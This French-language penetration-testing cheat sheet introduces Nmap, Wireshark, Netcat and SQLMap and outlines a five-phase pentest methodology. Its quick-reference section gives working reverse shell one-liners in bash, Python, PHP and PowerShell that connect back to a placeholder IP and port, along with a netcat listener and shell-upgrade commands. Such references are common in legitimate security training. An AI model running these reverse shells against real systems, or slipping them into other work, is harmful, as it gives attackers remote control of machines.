Réseau Scanner
Nmap
Découverte d'hôtes, scan de ports, identification de services et OS. L'outil incontournable du pentesteur.
$ nmap -sS -sV -O -p- <cible>

Réseau Analyse
Wireshark
Analyseur de protocole réseau pour capturer et examiner le trafic en temps réel. Filtres BPF & display filters.
$ wireshark -i eth0 -k -w capture.pcap
⚡ Cheatsheet 📖 Docs

Réseau Shells
Netcat (nc)
Le "couteau suisse" du réseau. Connexions TCP/UDP, reverse shells, transferts de fichiers, port scanning.
$ nc -lvnp 4444

Web SQLi
SQLMap
Détection et exploitation automatique des injections SQL. Dump de BDD, bypass WAF, lecture/écriture de fichiers.
$ sqlmap -u "http://target/?id=1" --dbs

⚡ Référence rapide — Reverse Shells

Commandes essentielles pour établir des connexions. Remplacez IP et PORT par vos valeurs.

bash / sh / python / php / powershell 
# Bash reverse shell
bash -i >& /dev/tcp/IP/PORT 0>&1

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'

# PHP
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"

# Listener Netcat
nc -lvnp PORT

# Upgrade shell TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z puis :
stty raw -echo; fg
📋 Méthodologie Pentest

Les 5 phases standard d'un test d'intrusion.

1️⃣
Reconnaissance
OSINT, Shodan, theHarvester, Google Dorks, WHOIS, DNS
2️⃣
Scan & Énumération
Nmap, Nikto, Enum4linux, SMBclient, Gobuster, Dirb
3️⃣
Exploitation
Metasploit, SQLMap, Burp Suite, exploits manuels
4️⃣
Post-Exploitation
Privilege escalation, persistence, pivoting, dump credentials
5️⃣
Rapport
Documentation des vulnérabilités, CVSS scoring, recommandations
